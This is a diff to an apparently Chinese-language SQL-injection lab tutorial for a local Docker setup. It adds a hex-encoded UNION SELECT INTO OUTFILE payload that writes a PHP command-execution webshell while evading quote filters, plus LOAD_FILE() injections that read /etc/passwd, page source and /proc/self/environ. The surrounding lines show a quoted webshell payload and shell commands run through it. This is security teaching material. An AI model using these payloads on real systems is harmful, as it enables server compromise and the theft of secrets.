@@ -79,8 +79,13 @@ INTO OUTFILE '/var/www/html/shell.php';
 </ul>
 
 <h4>Step 3 — 寫入 WebShell</h4>
+<p>一般寫法（使用引號）：</p>
 <ul>
   <li><code>?id=0 UNION SELECT 1,"&lt;?php echo shell_exec($_GET['c']);?&gt;",3 INTO OUTFILE '/var/www/html/shell.php'--+</code></li>
+</ul>
+<p>Hex 編碼寫法（無需引號，可繞過引號過濾）：</p>
+<ul>
+  <li><code>?id=0 UNION SELECT 1,0x3c3f706870206563686f207368656c6c5f6578656328245f4745545b2763275d293b3f3e,3 INTO OUTFILE '/var/www/html/shell.php'--+</code></li>
 </ul>
 <p>⚠️ 路徑說明：MySQL container 內的 <code>/var/www/html/</code> 透過 volume 對應到主機的 <code>~/sqli-lab/web/</code>，所以寫進去的檔案 Apache 馬上可以存取。</p>
 
@@ -91,6 +96,19 @@ INTO OUTFILE '/var/www/html/shell.php';
   <li><code>/shell.php?c=cat /etc/passwd</code></li>
   <li><code>/shell.php?c=ls /var/www/html</code></li>
 </ul>
+
+<h4>Step 5 — LOAD_FILE() 讀取伺服器檔案</h4>
+<p>同樣需要 <code>FILE</code> 權限，可直接讀取伺服器上的任意檔案：</p>
+<ul>
+  <li><code>?id=0 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--+</code> ← 讀取系統帳號清單</li>
+  <li><code>?id=0 UNION SELECT 1,LOAD_FILE('/etc/hosts'),3--+</code> ← 讀取網路設定</li>
+  <li><code>?id=0 UNION SELECT 1,LOAD_FILE('/var/www/html/outfile.php'),3--+</code> ← 讀取本頁原始碼</li>
+  <li><code>?id=0 UNION SELECT 1,LOAD_FILE('/proc/self/environ'),3--+</code> ← 讀取環境變數（含敏感資訊）</li>
+</ul>
+<p>⚠️ <code>LOAD_FILE()</code> 回傳 NULL 代表檔案不存在、沒有讀取權限，或檔案超過 <code>max_allowed_packet</code> 大小限制。</p>
+<p>用 phpMyAdmin 也可以直接跑：</p>
+<pre>SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/var/www/html/login.php');</pre>
 
 <h4>常見錯誤</h4>
 <ul>
